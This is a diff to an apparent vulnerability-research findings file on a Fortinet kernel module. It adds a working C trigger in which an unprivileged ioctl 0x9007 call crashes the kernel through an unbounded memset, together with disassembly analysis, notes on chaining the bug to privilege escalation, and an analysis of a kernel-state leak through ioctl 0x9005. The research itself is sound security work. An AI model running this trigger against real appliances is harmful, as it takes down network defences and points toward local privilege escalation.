@@ -563,17 +563,26 @@ mov byte ptr [r13 + rax], 0            ; write past massive allocation -> furthe
 
     "trigger_poc": """
 // No root required. Any process, any fd.
+// Triggers kernel crash (DoS) via memset(heap_buf, 0, SIZE_MAX) in copy_from_user error path.
 int fd = open("/dev/null", O_RDONLY);
 
+// mmap any valid user region (addr only needs to be non-NULL; no data is actually read)
+void *user_region = mmap(NULL, 4096, PROT_READ, MAP_ANON|MAP_PRIVATE, -1, 0);
+
 struct {
-    uint32_t word0;        // <= 0x40 (valid ID, e.g. 1)
-    uint32_t word1;        // = 0xffffffff -> overflow to kmalloc(0)
-    uint64_t string_ptr;   // pointer to large mmapped region
-} payload = {1, 0xffffffff, (uint64_t)mmap(...)};
+    uint32_t word0;        // <= 0x40 (pass first bounds check)
+    uint32_t word1;        // = 0xffffffff -> lea edi,[rax+1] wraps to 0 -> kmalloc(0)
+    uint64_t string_ptr;   // any valid user ptr (access_ok fails at SIZE_MAX regardless)
+} payload = {1, 0xffffffff, (uint64_t)user_region};
 
 ioctl(fd, 0x9007, &payload);
-// -> kmalloc(0) + copy_from_user(zero_buf, mmap_region, SIZE_MAX)
-// -> heap corruption of adjacent SLUB objects
+// Execution path:
+//   kmalloc(0) -> valid zero-size SLUB buf at heap_addr
+//   copy_from_user(heap_addr, user_region, SIZE_MAX):
+//     access_ok: user_region + SIZE_MAX overflows -> carry set -> jb error_path
+//     error_path: r13 = SIZE_MAX; sub rbx,r13 = 0; rdx = SIZE_MAX
+//     memset(heap_addr, 0, SIZE_MAX) -> rep stosq 0x1fffffffffffffff times
+//     -> kernel crash when rep stosq hits unmapped kernel page
 """,
 
     "ablation_bert_queries_matched": ["BUFFER_OVERFLOW", "RACE_CONDITION"],
@@ -587,14 +596,42 @@ ioctl(fd, 0x9007, &payload);
         "No privilege required; no special device node required."
     ),
 
+    "access_ok_analysis": {
+        "copy_from_user_vma": "0xffffffff805f6bed",
+        "access_ok_mechanism": (
+            "Custom Fortinet copy_from_user: reads per-task addr_limit from gs:[0x14d80]+0x9d8. "
+            "Computes src + size (64-bit add); if carry set (overflow), jb to error path. "
+            "For SIZE_MAX (0xffffffffffffffff): any non-zero src causes carry -> ERROR PATH taken."
+        ),
+        "error_path_bug": (
+            "ERROR PATH BUG: On access_ok failure, code at 0x5f6c19 sets r13=rbx=SIZE_MAX. "
+            "jne 0x5f6c3a -> sub rbx,r13 = 0; lea rdi,[r12+0]=heap_buf; mov rdx,r13=SIZE_MAX; "
+            "xor esi,esi; call memset(heap_buf, 0, SIZE_MAX). "
+            "This calls the `rep stosq` memset at 0xcd2e10 with rcx=SIZE_MAX>>3 = 0x1fffffffffffffff. "
+            "rep stosq writes zeros starting from heap_buf until hitting an unmapped kernel page, "
+            "corrupting ALL adjacent SLUB objects en route -> kernel panic."
+        ),
+        "actual_primitive": "memset(heap_buf, 0, SIZE_MAX) via rep stosq — zero-write-to-crash, NOT arbitrary data write",
+        "dos_confirmed": True,
+        "code_exec_path": (
+            "Code execution requires: (1) KASLR bypass (FGT-F15 does not provide this), "
+            "(2) heap grooming to place a sensitive function pointer at heap_buf+N where N < first unmapped page gap, "
+            "(3) zeroing that function pointer into a controlled call path. Hard but non-trivial."
+        ),
+    },
+
     "caveats": [
-        "access_ok() behavior with SIZE_MAX depends on kernel version and architecture",
-        "SLUB hardening (SLAB_FREELIST_HARDENED, KASAN) may prevent exploitation",
-        "Requires the LSM file_ioctl hook identification to be confirmed (rdi=struct file* ignored)",
-        "Alternate: if NOT the LSM hook but a char device, requires opening /dev/fortism* node",
+        "access_ok with SIZE_MAX CORRECTLY FAILS (error path taken, no user data copied)",
+        "The bug is in the error cleanup path: memset(heap_buf, 0, SIZE_MAX) called unconditionally",
+        "Actual primitive: reliable zero-write heap spray from heap_buf until unmapped page -> DoS",
+        "LPE requires KASLR bypass + heap grooming to redirect zeroed function pointer",
+        "SLUB hardening (SLAB_FREELIST_HARDENED, KASAN) may prevent LPE but not DoS",
     ],
 
-    "status": "CRITICAL CANDIDATE — integer overflow path confirmed in disassembly; LPE depends on access_ok wrap behavior and SLUB state",
+    "status": (
+        "CRITICAL — DoS confirmed (kernel crash via memset(heap_buf, 0, SIZE_MAX) in error path); "
+        "code exec requires chaining with KASLR bypass + heap layout control"
+    ),
 }
 
 # ─────────────────────────────────────────────────────────
@@ -652,7 +689,28 @@ ioctl(any_fd, 0x9005, &leaked_val);
         "of FGT-F11 or other kernel memory corruption primitives."
     ),
 
-    "status": "CONFIRMED — copy_to_user with hardcoded kernel address, no privilege check; what's at 0x81889310 needs dynamic analysis to determine if it leaks pointer material",
+    "ramdump_analysis": {
+        "live_value_hex":   "0x9f1bb0bc",
+        "live_value_type":  "runtime state counter/epoch — NOT a kernel pointer",
+        "kaslr_bypass":     False,
+        "rationale": (
+            "Ramdump read at phys 0x2889310 (VMA 0x81889310): 4-byte value = 0x9f1bb0bc. "
+            "Top 32 bits are 0x00000000 in the full 8-byte read (0xae8537c19f1bb0bc reflects "
+            "two adjacent 32-bit fields). Value does not have 0xffff... kernel pointer prefix. "
+            "Cross-checking static vmlinux: .data BSS-zero at foff 0x1889310, confirming it is "
+            "a dynamically assigned runtime value. "
+            "Write site (vma 0x8055d948): `mov dword ptr [rip+disp], 1` during fortism init "
+            "path (after successful registration call). Value later changes to 0x9f1bb0bc, "
+            "suggesting it is incremented/modified during module operation (epoch or session counter). "
+            "12 RIP-relative readers in the 0x554xxx-0x55dxxx range all perform 32-bit reads. "
+            "Conclusion: this is a Fortinet internal session-state counter, NOT a kernel address. "
+            "KASLR bypass REFUTED. Finding remains MEDIUM: kernel internal state leaked without "
+            "privilege check to any caller."
+        ),
+    },
+
+    "status": "CONFIRMED — unauthorized kernel state leak via copy_to_user(user_ptr, 0x81889310, 4); "
+              "live value 0x9f1bb0bc is runtime counter (NOT address material); KASLR bypass REFUTED",
 }
 
 # ─────────────────────────────────────────────────────────
